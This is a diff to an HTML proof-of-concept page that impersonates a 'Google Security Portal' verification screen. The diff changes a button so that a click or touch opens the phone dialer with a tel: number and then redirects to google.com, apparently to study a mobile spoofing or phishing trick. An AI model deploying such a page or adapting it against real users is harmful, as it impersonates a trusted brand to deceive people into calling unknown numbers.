@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Protocol Tel PoC</title>
+    <title>Protocol Tel & Redirect PoC</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -41,6 +41,7 @@
             border-radius: 8px;
             box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
             transition: background-color 0.2s;
+            cursor: pointer;
         }
         a.spoof-link:active {
             background-color: #1557b0;
@@ -57,20 +58,28 @@
     <div class="banner">Google Security Portal</div>
     <h1>Secure Verification System</h1>
 
-    <!-- Target Link: Memicu protokol tel: dan redirect ke google.com -->
-    <a href="tel:+18005550199" class="spoof-link" id="targetLink">Open Phone Dialer & Verify</a>
+    <!-- Target Link -->
+    <a class="spoof-link" id="targetLink">Open Phone Dialer & Redirect to Google</a>
 
     <div class="footer-note">Cloud-secured verification system.</div>
 
     <script>
         const targetElement = document.getElementById("targetLink");
 
-        targetElement.addEventListener("click", (e) => {
-            // Berikan jeda singkat atau biarkan protokol tel: berjalan, lalu arahkan ke google.com
+        const triggerAction = (e) => {
+            e.preventDefault();
+            
+            // 1. Memicu protokol tel: via window.location
+            window.location.href = "tel:+18005550199";
+
+            // 2. Redirect ke google.com setelah jeda singkat
             setTimeout(() => {
                 window.location.href = "https://google.com";
-            }, 500);
-        });
+            }, 600);
+        };
+
+        targetElement.addEventListener("click", triggerAction);
+        targetElement.addEventListener("touchstart", triggerAction, { passive: false });
     </script>
 
 </body>
